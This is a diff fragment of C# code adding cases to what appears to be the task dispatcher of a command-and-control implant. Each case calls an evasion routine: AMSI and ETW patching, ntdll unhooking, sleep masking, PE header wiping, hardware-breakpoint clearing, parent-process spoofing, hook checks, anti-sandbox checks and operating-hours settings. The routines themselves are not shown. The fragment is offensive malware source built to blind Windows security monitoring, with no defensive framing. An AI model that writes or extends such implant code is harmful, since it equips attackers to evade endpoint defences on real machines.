@@ -1,0 +1,43 @@
+                case "AMSI_PATCH":
+                    result = Evasion.PatchAmsi(task.args ?? "");
+                    break;
+                case "ETW_PATCH":
+                case "ETW_BYPASS":
+                    result = Evasion.PatchEtw();
+                    break;
+                case "NTDLL_UNHOOK":
+                    result = Evasion.UnhookNtdll();
+                    break;
+                case "APPLY_EVASION":
+                    result = Evasion.ApplyEvasion();
+                    break;
+                case "SLEEP_MASK":
+                {
+                    bool on = string.IsNullOrEmpty(task.args) || task.args.Trim().ToLower() == "on";
+                    result = Evasion.SetSleepMask(on);
+                    break;
+                }
+                case "PE_WIPE":
+                    result = Evasion.WipePeHeader();
+                    break;
+                case "HWBP_CLEAR":
+                    result = Evasion.ClearHwbp();
+                    break;
+                case "PPID_SPOOF":
+                    result = Evasion.SpawnWithPpid(task.args ?? "");
+                    break;
+                case "HOOKCHECK":
+                case "HOOK_CHECK":
+                    result = Evasion.CheckHooks();
+                    break;
+                case "ANTI_SANDBOX":
+                    result = Evasion.AntiSandbox();
+                    break;
+                case "WORK_HOURS":
+                case "WORK_HOURS_SET":
+                    result = Evasion.SetWorkHours(task.args ?? "");
+                    break;
+                case "DNS_CANARY":
+                case "DNS_CANARY_SET":
+                    result = Evasion.SetDnsCanary(task.args ?? "");
+                    break;
